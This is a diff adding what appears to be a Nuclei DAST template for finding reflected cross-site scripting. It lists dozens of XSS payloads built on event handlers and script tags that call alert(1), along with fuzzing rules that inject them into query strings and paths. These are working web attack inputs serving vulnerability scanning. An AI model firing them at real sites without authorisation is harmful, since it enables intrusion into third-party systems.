@@ -1,0 +1,93 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>"
+        - "<style>:target {color:red;}</style><input id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)>"
+        - "<style>:target {color:red;}</style><bdi id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></bdi>"
+        - "<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input autofocus>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>"
+        - "&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;"
+        - "<map onbeforepaste=\"alert(1)\" contenteditable>test</map>"
+        - "<html:script>alert(1)</html:script>"
+        - "<frame onbeforecut=\"alert(1)\" contenteditable>test</frame>"
+        - "<frameset onbeforepaste=\"alert(1)\" contenteditable>test</frameset>"
+        - "<output id=x tabindex=1 onbeforeactivate=alert(1)></output>"
+        - "<img src\\x2Eonerror=\"javascript:alert(1)\">"
+        - "<output id=x tabindex=1 onbeforeactivate=alert(1)></output>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><kbd id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></kbd>"
+        - "<marquee><h1 id=x tabindex=1 onactivate=alert(1)></h1>"
+        - "<iframe/onload=javascript:alert(1)><img/src=x onerror=javascript:javascript:alert(2)>"
+        - "<multicol draggable=\"true\" ondragend=\"alert(1)\">test</multicol>"
+        - "<video oncopy=\"alert(1)\" contenteditable>test</video>"
+        - "<output onload=alert(1)></output><noscript>"
+        - "<a href=\"jav&#x09;ascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
+        - "<p id=x tabindex=1 ondeactivate=alert(1)></p><input autofocus>"
+        - "<plaintext onpaste=\"alert(1)\" contenteditable>test</plaintext>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>"
+        - "<script>alert(\"XSS\");</script>"
+        - "<style>:target {color:red;}</style><object id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></object>"
+        - "<details draggable=\"true\" ondragend=\"alert(1)\">test</details>"
+        - "<embed src=about:javascript:alert(1) onload=alert(1)>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>"
+        - "<svg><link rel=import href=data:text/html,&lt;style&gt;font-family:'sans';&lt;/style&gt;&gt;&lt;&#65281;&#65038;&#65118;&#64773;&#65302;&#65533;&#64365;&#64512&#64691&#65286>&gt;"
+        - "<script>alert(1)</script>"
+        - "<sub id=x tabindex=1 onfocusin=alert(1)></sub>"
+        - "<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>"
+        - "<map draggable=\"true\" ondragstart=\"alert(1)\">test</map>"
+        - "<basefont draggable=\"true\" ondragend=\"alert(1)\">test</basefont>"
+        - "<style>@keyframes x{}</style><input style=\"animation-name:x\" onanimationstart=\"alert(1)\"></input>"
+        - "<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>"
+        - "<xmp draggable=\"true\" ondragend=\"alert(1)\">test</xmp>"
+        - "<embed draggable=\"true\" ondragend=\"alert(1)\">test</embed>"
+        - "<video autoplay onpause=alert(1)><source src=\"validvideofile.mp4\" type=\"video/mp4\"></video>"
+        - "<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>"
+        - "<frame onkeypress=\"alert(1)\" contenteditable>test</frame>"
+        - "<script>alert(1)</script>"
+        - "<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>"
+        - "<audio controls autoplay onloadedmetadata=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<body draggable=\"true\" ondragenter=\"alert(1)\">test</body>"
+        - "<svg draggable=\"true\" ondragend=\"alert(1)\">test</svg>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
